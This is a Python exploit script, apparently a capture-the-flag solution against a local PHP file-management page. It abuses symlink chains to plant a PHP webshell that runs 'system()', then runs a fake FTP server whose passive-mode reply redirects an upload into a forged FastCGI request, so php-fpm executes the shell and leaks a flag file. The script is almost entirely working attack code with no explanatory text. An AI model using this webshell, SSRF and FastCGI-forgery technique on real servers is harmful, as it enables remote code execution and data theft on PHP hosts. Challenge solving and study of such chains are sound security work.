import requests
import hashlib
import struct
import time
import threading
import socketserver

# FTP Server Config
LOCAL_PORT = 9000
REMOTE_FTP_SERVER = "127.0.0.1:31337"

class FakeFTP(socketserver.StreamRequestHandler):
    def _send(self, cmd):
        print(f'Sent "{cmd.decode()}"')
        self.wfile.write(cmd + b'\r\n')

    def handle(self):
        print('A new connection appears!')
        self._send(b'200 oh hai')
        while True:
            cmd = self.rfile.readline().rstrip()
            print(f'Got "{cmd.decode()}"')

            if cmd:
                cmd = cmd.split()[0]

            if cmd in (b'USER', b'TYPE'):
                self._send(b'200 ok')
            elif cmd in (b'SIZE', b'EPSV'):
                self._send(b'500 nope')
            elif cmd == b'PASV':
                self._send(f'227 go to (127,0,0,1,{LOCAL_PORT // 256},{LOCAL_PORT % 256})'.encode())
            elif cmd == b'STOR':
                self._send(b'150 do it!')
                self._send(b'226 nice knowing you')
            elif cmd in (b'', b'QUIT'):
                print('All done!')
                break
            else:
                raise Exception('Unknown command')

# Start FTP Server
def start_ftp():
    with socketserver.TCPServer(('', 31337), FakeFTP) as server:
        print('Welcome to FakeFTP')
        server.serve_forever()

ftp_thread = threading.Thread(target=start_ftp, daemon=True)
ftp_thread.start()

TARGET = "http://127.0.0.1:8002"

s = requests.Session()
s.cookies.set("PHPSESSID", "strellmao")
folder = hashlib.md5("strellmao".encode()).hexdigest()

def create(s, filename, symlink=None):
    while True:
        data = {"filename": filename, "mode": "create"}
        if symlink:
            data["symlink"] = "1"
            data["target"] = symlink
        r = s.post(f"{TARGET}/citrus.php%3Flime.php", data=data)
        time.sleep(0.25)
        r = s.get(f"{TARGET}/citrus.php%3Flime.php")
        if symlink and f"Symlink to {symlink}" not in r.text:
            continue
        if f'name="filename" value="{filename}"' not in r.text:
            continue
        break

    if symlink:
        print(f"created {filename} -> {symlink}")
    else:
        print(f"created {filename}")

def delete(s, filename):
    while True:
        r = s.post(f"{TARGET}/citrus.php%3Flime.php", data={
            "filename": filename,
            "mode": "delete"
        })
        time.sleep(0.25)
        r = s.get(f"{TARGET}/citrus.php%3Flime.php")
        if f'name="filename" value="{filename}"' in r.text:
            continue
        break

    print(f"deleted {filename}")

def write(s, filename, data):
    while True:
        r = s.post(f"{TARGET}/citrus.php%3Flime.php", data={
            "filename": filename,
            "mode": "write",
            "data": data
        })
        time.sleep(0.25)
        r = s.get(f"{TARGET}/citrus.php%3Flime.php")
        if f'name="filename" value="{filename}"' not in r.text:
            continue
        break

    print(f"wrote {filename}")

def read(s, filename):
    r = s.post(f"{TARGET}/citrus.php%3Flime.php", data={
        "filename": filename,
        "mode": "read"
    })
    print(r.text)

# First stage - Create PHP webshell
create(s, "c", symlink=".")
create(s, "b", symlink="c")
create(s, "a", symlink="b")
delete(s, "c")
create(s, "a", symlink=f"/tmp/{folder}/pwn.php")
write(s, "a", f"<?php system('/proo* > /tmp/{folder}/flag'); ?>")

# Second stage - Create symlink chain with FTP
s2 = requests.Session()
s2.cookies.set("PHPSESSID", "strellmao2")
create(s2, "c", symlink=".")
create(s2, "b", symlink="c")
create(s2, "a", symlink="b")
delete(s2, "c")
create(s2, "a", symlink=f"ftp://{REMOTE_FTP_SERVER}/pwned")

# FastCGI constants
FCGI_BEGIN_REQUEST = 1
FCGI_PARAMS = 4
FCGI_STDIN = 5
FCGI_RESPONDER = 1

def create_packet(packet_type, content):
    version, request_id, padding_length, reserved = 1, 1, 0, 0
    header = struct.pack('>BBHHBB', version, packet_type, request_id, len(content), padding_length, reserved)
    return header + content

def pack_params(params):
    result = b''
    for k, v in params.items():
        assert len(k) <= 127 and len(v) <= 127
        result += struct.pack('>BB', len(k), len(v)) + k.encode() + v.encode()
    return result

# FastCGI payload
params = {
    'SCRIPT_FILENAME': f'/tmp/{folder}/pwn.php',
    'QUERY_STRING': '',
    'SCRIPT_NAME': f'/tmp/{folder}/pwn.php',
    'REQUEST_METHOD': 'GET',
}

evil_fcgi_packet = b''.join([
    create_packet(FCGI_BEGIN_REQUEST, struct.pack('>H', FCGI_RESPONDER) + b'\x00' * 6),
    create_packet(FCGI_PARAMS, pack_params(params)),
    create_packet(FCGI_PARAMS, pack_params({})),
    create_packet(FCGI_STDIN, b''),
])

write(s2, "c", evil_fcgi_packet)

time.sleep(3)
read(s, "flag")